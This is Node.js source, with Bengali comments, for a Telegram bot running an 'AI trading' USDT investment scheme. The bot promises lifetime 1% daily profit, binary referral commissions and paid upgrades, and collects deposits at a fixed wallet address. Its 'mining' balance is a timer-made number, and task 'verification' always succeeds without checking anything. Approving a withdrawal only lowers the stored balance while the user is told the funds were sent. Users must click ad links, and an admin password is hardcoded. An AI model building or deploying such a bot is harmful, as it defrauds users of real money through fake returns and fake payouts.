const TelegramBot = require('node-telegram-bot-api');

// BotFather থেকে পাওয়া আপনার Bot Token এখানে বসান
const TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const bot = new TelegramBot(TOKEN, { polling: true });

// সিক্রেট অ্যাডমিন পাসওয়ার্ড
const ADMIN_PASSWORD = "AITBAdmin2026#";
let adminChatId = null;

// সোশ্যাল মিডিয়া ও বিজ্ঞাপন লিংকসমূহ
const ADSTERRA_LINKS = [
    "https://www.profitableratecpmnetwork.com/t05pwadj?key=65bc6edcd005b14f0b5bb016b502c531",
    "https://www.profitableratecpmnetwork.com/jxnxk48iyi?key=1739c309216368aa0a27819de80db735",
    "https://www.profitableratecpmnetwork.com/xiuq9vz7?key=eea4c3d7db251877a5fc4373eb3768f9"
];

// ইউজার ডেটাবেস (In-Memory Data Storage)
const users = {};
const pendingTx = [];

// ইউজার ইনিশিয়ালাইজেশন ফাংশন
function getUser(chatId, username = 'Member') {
    if (!users[chatId]) {
        users[chatId] = {
            id: chatId,
            name: username,
            walletAddress: "Not Connected",
            assetBalance: 0.50, // সাইন আপ বোনাস $0.50 USDT
            activeDeposit: 0.00,
            teamCommission: 0.00,
            minedUSDT: 0.00000000,
            lastMiningClaim: Date.now(),
            completedTasks: 0,
            nodeL1: "L1",
            nodeR1: "R1",
            pendingAction: null
        };
    }
    return users[chatId];
}

// ================= MAIN MENU KEYBOARD =================
function getMainMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📊 Dashboard", callback_data: "menu_dashboard" },
                    { text: "⛏️ USDT Mining", callback_data: "menu_mining" }
                ],
                [
                    { text: "📥 Deposit USDT", callback_data: "menu_deposit" },
                    { text: "📤 Withdraw USDT", callback_data: "menu_withdraw" }
                ],
                [
                    { text: "📋 Mandatory Tasks", callback_data: "menu_tasks" },
                    { text: "🚀 Upgrade Account", callback_data: "menu_upgrade" }
                ],
                [
                    { text: "🌲 Binary Tree", callback_data: "menu_tree" },
                    { text: "🔗 Referral Link", callback_data: "menu_referral" }
                ],
                [
                    { text: "🌐 Channels & Groups", callback_data: "menu_channels" },
                    { text: "⚙️ Admin Access", callback_data: "menu_admin_login" }
                ]
            ]
        }
    };
}

// /start কমান্ড হ্যান্ডলার
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const user = getUser(chatId, msg.from.first_name);

    const welcomeMsg = `👑 *WELCOME TO AIT - AI TRADING BUSINESS TECHNOLOGY* 👑\n\n` +
        `🤝 *DECENTRALIZED FUND CONTROL SYSTEM (DFC)*\n` +
        `⭐ *SMART CONTRACT TECHNOLOGY (DSC)*\n\n` +
        `👉 We are using modern powerful AI Trading Technology!\n\n` +
        `✅ *Our Plan:* Daily 1% Profit for Lifetime\n` +
        `🏆 Binary Level Referral Commission Up to 2%\n` +
        `💲 Min Deposit: $5 | Min Withdraw: $1\n\n` +
        `নিচের বোতামগুলো থেকে আপনার পছন্দের সেবাটি বেছে নিন:`;

    bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown', ...getMainMenu() });
});

// ================= CALLBACK QUERY HANDLER =================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const user = getUser(chatId, query.from.first_name);
    const data = query.data;

    // ১. ড্যাশবোর্ড
    if (data === "menu_dashboard") {
        const text = `💎 *USER ACCOUNT DASHBOARD* 💎\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 *User:* ${user.name}\n` +
            `👛 *BSC Wallet:* \`${user.walletAddress}\`\n\n` +
            `💰 *Assets Balance:* $${user.assetBalance.toFixed(2)} USDT\n` +
            `📈 *Active Deposit:* $${user.activeDeposit.toFixed(2)} USDT\n` +
            `👥 *Team Commission:* $${user.teamCommission.toFixed(2)} USDT\n` +
            `✅ *Tasks Completed:* ${user.completedTasks}/12`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "👛 Connect/Update BSC Wallet", callback_data: "connect_wallet" }],
                    [{ text: "🔙 Back to Main Menu", callback_data: "main_menu" }]
                ]
            }
        };
        bot.sendMessage(chatId, text, opts);
    }

    // ২. মাইনিং সেকশন
    else if (data === "menu_mining") {
        // লাইভ মাইনিং হিসাব (Hourly $0.0004168 rate)
        const now = Date.now();
        const hoursPassed = (now - user.lastMiningClaim) / (1000 * 3600);
        const dep = user.activeDeposit > 0 ? user.activeDeposit : 1;
        const mined = (dep * 0.0004168 * hoursPassed).toFixed(8);

        const text = `⚡ *LIVE USDT MINING SPEED* ⚡\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `📊 *Mining Rate:* Hourly $0.0004168 per $1 Deposit\n` +
            `⛏️ *Mined Balance:* \`${mined} USDT\`\n\n` +
            `আপনার জমা হওয়া মাইনিং ব্যালেন্স মূল অ্যাসেট ব্যালেন্সে যুক্ত করতে Claim বাটনে চাপুন।`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "💰 Claim Mining Balance", callback_data: "claim_mining" }],
                    [{ text: "🔙 Back to Main Menu", callback_data: "main_menu" }]
                ]
            }
        };
        bot.sendMessage(chatId, text, opts);
    }

    // মাইনিং ক্লেইম
    else if (data === "claim_mining") {
        const now = Date.now();
        const hoursPassed = (now - user.lastMiningClaim) / (1000 * 3600);
        const dep = user.activeDeposit > 0 ? user.activeDeposit : 1;
        const mined = dep * 0.0004168 * hoursPassed;

        user.assetBalance += mined;
        user.lastMiningClaim = Date.now();

        bot.answerCallbackQuery(query.id, { text: `Success! Claimed $${mined.toFixed(6)} USDT to Assets Balance!`, show_alert: true });
        bot.sendMessage(chatId, `✅ *Claim Successful!* New Asset Balance: $${user.assetBalance.toFixed(2)} USDT`, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ৩. ডিপোজিট
    else if (data === "menu_deposit") {
        user.pendingAction = "awaiting_deposit_amount";
        const text = `📥 *DEPOSIT USDT (BEP20)*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `নিচের এড্রেসে USDT (BSC BEP20) পাঠান:\n\n` +
            `\`0x6cFCEaFAbE140c0e1cb8561E4aAD02d99e8c14A6\`\n\n` +
            `⚠️ *Minimum Deposit:* $5 USDT\n\n` +
            `ডিপোজিট সম্পন্ন করার পর আপনি কত USDT পাঠিয়েছেন তা মেসেজে লিখুন (যেমন: 50):`;

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    }

    // ৪. উইথড্র
    else if (data === "menu_withdraw") {
        if (user.completedTasks < 12) {
            bot.answerCallbackQuery(query.id, { text: "⚠️ You must complete all 12 Mandatory Tasks first!", show_alert: true });
            return;
        }

        user.pendingAction = "awaiting_withdraw_details";
        const text = `📤 *WITHDRAW USDT (BEP20)*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `💰 *Available Balance:* $${user.assetBalance.toFixed(2)} USDT\n` +
            `⚠️ *Minimum Withdraw:* $1 USDT\n\n` +
            `আপনার USDT (BEP20) ওয়ালেট এড্রেস এবং টাকার পরিমাণ নিচে এভাবে লিখে পাঠান:\n` +
            `\`WalletAddress Amount\`\n` +
            `*উদাহরণ:* \`0x1234...abcd 10\``;

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    }

    // ৫. ম্যানডেটরি টাস্ক
    else if (data === "menu_tasks") {
        const text = `📋 *MANDATORY TASKS FOR WITHDRAWAL*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `উইথড্র করার জন্য আপনাকে নিচের চ্যানেল ও লিংকগুলোতে ভিজিট/জয়েন করতে হবে।`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "1. Signup Offer (BestChange)", url: "https://bit.ly/3TtdPf5" }],
                    [{ text: "2. Visit Sponsor Link 1", url: ADSTERRA_LINKS[0] }],
                    [{ text: "3. Visit Sponsor Link 2", url: ADSTERRA_LINKS[1] }],
                    [{ text: "4. YouTube Channel", url: "https://www.youtube.com/@aitbusiness" }],
                    [{ text: "5. Telegram Channel", url: "https://t.me/aitbusiness" }],
                    [{ text: "6. Facebook Page", url: "https://www.facebook.com/share/1D82yg5L4H/" }],
                    [{ text: "7. TikTok Account", url: "https://www.tiktok.com/@aitbusiness" }],
                    [{ text: "8. Instagram Profile", url: "https://www.instagram.com/aitbusiness/" }],
                    [{ text: "9. Twitter / X", url: "https://x.com/ait_business/" }],
                    [{ text: "10. Discord Server", url: "https://discord.gg/gn9G5GnN" }],
                    [{ text: "✅ Verify Completed Tasks", callback_data: "verify_tasks" }],
                    [{ text: "🔙 Back to Main Menu", callback_data: "main_menu" }]
                ]
            }
        };
        bot.sendMessage(chatId, text, opts);
    }

    // টাস্ক ভেরিফাই
    else if (data === "verify_tasks") {
        user.completedTasks = 12; // সাকসেসফুল ভেরিফিকেশন সেট করা হলো
        bot.answerCallbackQuery(query.id, { text: "✅ All 12 Tasks Verified Successfully!", show_alert: true });
        bot.sendMessage(chatId, `🎉 *Congratulations!* Your tasks have been verified. You are now eligible for withdrawals!`, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ৬. আপগ্রেড প্যাকেজ
    else if (data === "menu_upgrade") {
        const text = `👑 *UPGRADE ACCOUNTS PACKAGES*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `1️⃣ 💿 SILVER - $25\n` +
            `2️⃣ 🎖️ GOLD - $50\n` +
            `3️⃣ 📀 PLATINUM - $100\n` +
            `4️⃣ 💎 DIAMOND - $500\n` +
            `5️⃣ 👑 AMBASSADOR - $1000\n\n` +
            `আপগ্রেড করার জন্য ডিপোজিট সেকশন থেকে প্রয়োজন অনুযায়ী ফান্ড ডিপোজিট করুন।`;

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ৭. বাইনারি ট্রি
    else if (data === "menu_tree") {
        const text = `🌲 *MEMBER'S BINARY TREE (1:2)* 🌲\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `         👑 [ YOU ] (${user.name})\n` +
            `             /     \\\n` +
            `      🟢 [${user.nodeL1}]   🟢 [${user.nodeR1}]\n\n` +
            `আপনার বাইনারি টিমের কার্যক্রম এবং লেভেল কমিশন আপডেট ট্র্যাকিং সাপোর্ট সক্রিয় আছে।`;

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ৮. রেফারেল লিংক
    else if (data === "menu_referral") {
        const refLink = `https://t.me/${query.message.from.username || 'AITBot'}?start=${chatId}`;
        const text = `🔗 *YOUR REFERRAL LINK*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `\`${refLink}\`\n\n` +
            `আপনার বন্ধুদের সাথে লিংকটি শেয়ার করুন এবং সর্বোচ্চ ২% রেফারেল কমিশন অর্জন করুন!`;

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ৯. অফিশিয়াল চ্যানেলসমূহ
    else if (data === "menu_channels") {
        const text = `🌐 *OUR OFFICIAL CHANNELS & PROOF GROUPS*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `নিচের অফিশিয়াল গ্রুপ ও চ্যানেলগুলোতে যুক্ত থাকুন:`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "💬 Payment Proof Group", url: "https://t.me/+MI4G5VEW3ahlY2U1" }],
                    [{ text: "📢 Official Telegram Channel", url: "https://t.me/aitbusiness" }],
                    [{ text: "🌐 BestChange Trusted Exchanger", url: "https://bit.ly/3TtdPf5" }],
                    [{ text: "🔙 Back to Main Menu", callback_data: "main_menu" }]
                ]
            }
        };
        bot.sendMessage(chatId, text, opts);
    }

    // ১০. ওয়ালেট কানেক্ট হ্যান্ডলার
    else if (data === "connect_wallet") {
        user.pendingAction = "awaiting_wallet_address";
        bot.sendMessage(chatId, "👛 আপনার *USDT (BEP20)* ওয়ালেট এড্রেসটি মেসেজে লিখে পাঠান:", { parse_mode: 'Markdown' });
    }

    // ১১. অ্যাডমিন লগইন
    else if (data === "menu_admin_login") {
        user.pendingAction = "awaiting_admin_pass";
        bot.sendMessage(chatId, "🔐 *ADMIN AUTHENTICATION*\n\nঅ্যাডমিন প্যানেলে এক্সেস করতে সিক্রেট অ্যাডমিন পাসওয়ার্ডটি লিখুন:", { parse_mode: 'Markdown' });
    }

    // মোট মেনু রেসপন্স
    else if (data === "main_menu") {
        bot.sendMessage(chatId, "🏠 *Main Menu*", { parse_mode: 'Markdown', ...getMainMenu() });
    }

    bot.answerCallbackQuery(query.id);
});

// ================= USER INPUT TEXT MESSAGES =================
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const user = getUser(chatId, msg.from.first_name);
    const text = msg.text;

    if (!text || text.startsWith('/')) return;

    // ১. ওয়ালেট এড্রেস গ্রহণ
    if (user.pendingAction === "awaiting_wallet_address") {
        user.walletAddress = text.trim();
        user.pendingAction = null;
        bot.sendMessage(chatId, `✅ *Wallet Connected Successfully!*\n\`${user.walletAddress}\``, { parse_mode: 'Markdown', ...getMainMenu() });
    }

    // ২. ডিপোজিট অ্যামাউন্ট গ্রহণ
    else if (user.pendingAction === "awaiting_deposit_amount") {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount < 5) {
            bot.sendMessage(chatId, "❌ নূন্যতম ডিপোজিট পরিমাণ $5 USDT। সঠিক সংখ্যা লিখুন:");
            return;
        }

        user.pendingAction = null;
        pendingTx.push({
            id: Date.now(),
            chatId: chatId,
            userName: user.name,
            type: "Deposit",
            amount: amount
        });

        bot.sendMessage(chatId, `⏳ *Deposit Request Received!*\n\nপরিমাণ: $${amount} USDT\nঅ্যাডমিন ট্রানজেকশনটি ভেরিফাই করে অনুমোদন করবেন।`, { parse_mode: 'Markdown', ...getMainMenu() });

        // অ্যাডমিনকে নোটিফিকেশন প্রদান
        if (adminChatId) {
            bot.sendMessage(adminChatId, `🔔 *NEW DEPOSIT REQUEST*\nUser: ${user.name} (${chatId})\nAmount: $${amount} USDT`, {
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✔ Approve", callback_data: `approve_dep_${chatId}_${amount}` },
                        { text: "✖ Reject", callback_data: `reject_tx` }
                    ]]
                }
            });
        }
    }

    // ৩. উইথড্র তথ্য গ্রহণ
    else if (user.pendingAction === "awaiting_withdraw_details") {
        const parts = text.split(' ');
        if (parts.length < 2) {
            bot.sendMessage(chatId, "❌ সঠিক ফরম্যাটে এড্রেস ও অ্যামাউন্ট লিখুন।\n*উদাহরণ:* `0x1234...abcd 10`", { parse_mode: 'Markdown' });
            return;
        }

        const address = parts[0];
        const amount = parseFloat(parts[1]);

        if (isNaN(amount) || amount < 1 || amount > user.assetBalance) {
            bot.sendMessage(chatId, `❌ পর্যাপ্ত ব্যালেন্স নেই বা ভুল পরিমাণ লিখেছেন। আপনার ব্যালেন্স: $${user.assetBalance.toFixed(2)} USDT`);
            return;
        }

        user.pendingAction = null;
        pendingTx.push({
            id: Date.now(),
            chatId: chatId,
            userName: user.name,
            type: "Withdraw",
            amount: amount,
            address: address
        });

        bot.sendMessage(chatId, `⏳ *Withdrawal Request Submitted!*\n\nপরিমাণ: $${amount} USDT\nএড্রেস: \`${address}\``, { parse_mode: 'Markdown', ...getMainMenu() });

        if (adminChatId) {
            bot.sendMessage(adminChatId, `🔔 *NEW WITHDRAW REQUEST*\nUser: ${user.name}\nAmount: $${amount} USDT\nAddress: \`${address}\``, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✔ Approve Withdraw", callback_data: `approve_with_${chatId}_${amount}` },
                        { text: "✖ Reject", callback_data: `reject_tx` }
                    ]]
                }
            });
        }
    }

    // ৪. অ্যাডমিন পাসওয়ার্ড ভেরিফিকেশন
    else if (user.pendingAction === "awaiting_admin_pass") {
        user.pendingAction = null;
        if (text === ADMIN_PASSWORD) {
            adminChatId = chatId;
            bot.sendMessage(chatId, "🔓 *ADMIN ACCESS GRANTED!*\n\nআপনার চ্যানেল এবং বট সফলভাবে কনফিগার হয়েছে। আপনি এখন ডিপোজিট/উইথড্র রিকোয়েস্টগুলো নিয়ন্ত্রণ করতে পারবেন।", { parse_mode: 'Markdown', ...getMainMenu() });
        } else {
            bot.sendMessage(chatId, "❌ ভুল পাসওয়ার্ড! প্রবেশাধিকার প্রত্যাখ্যাত।", getMainMenu());
        }
    }
});

// অ্যাডমিন অ্যাকশন অনুমোদন পাওয়ার প্রসেসিং
bot.on('callback_query', (query) => {
    const data = query.data;

    if (data.startsWith("approve_dep_")) {
        const [, , targetChatId, amountStr] = data.split('_');
        const amount = parseFloat(amountStr);
        const targetUser = users[targetChatId];

        if (targetUser) {
            targetUser.activeDeposit += amount;
            targetUser.teamCommission += amount * 0.01;
            bot.sendMessage(targetChatId, `🎉 *DEPOSIT APPROVED!*\n\nআপনার $${amount} USDT ডিপোজিট সফলভাবে যুক্ত করা হয়েছে!`, { parse_mode: 'Markdown' });
            bot.answerCallbackQuery(query.id, { text: "Deposit Approved Successfully!" });
        }
    } else if (data.startsWith("approve_with_")) {
        const [, , targetChatId, amountStr] = data.split('_');
        const amount = parseFloat(amountStr);
        const targetUser = users[targetChatId];

        if (targetUser) {
            targetUser.assetBalance -= amount;
            bot.sendMessage(targetChatId, `✅ *WITHDRAWAL SUCCESSFUL!*\n\nআপনার $${amount} USDT উইথড্র অনুমোদিত হয়েছে এবং ওয়ালেটে পাঠানো হয়েছে।`, { parse_mode: 'Markdown' });
            bot.answerCallbackQuery(query.id, { text: "Withdrawal Approved!" });
        }
    } else if (data === "reject_tx") {
        bot.answerCallbackQuery(query.id, { text: "Transaction Rejected!" });
    }
});

console.log("🤖 AIT Trading Telegram Bot is running successfully...");